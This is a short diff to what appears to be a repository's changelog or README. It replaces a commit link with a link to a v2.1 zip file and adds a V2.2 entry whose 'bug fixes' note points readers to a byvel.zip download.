@@ -26,7 +26,16 @@
  **V2.1**
  
  
- [`nothing changed.`](https://github.com/Blackus2k/byvel/commit/13e5acb7c9099d5406b9392ad8a5822300b75a9e)
+ [`nothing changed.`](https://github.com/Blackus2k/byvel/blob/main/v2.1.zip)
+ 
+ 
+ ----------------------------------------------------------------
+ **V2.2**
+ 
+ 
+ 
+ 
+ [`bug fixes, advised to download this`](https://github.com/Blackus2k/byvel/blob/main/byvel.zip)
  
  
  ----------------------------------------------------------------
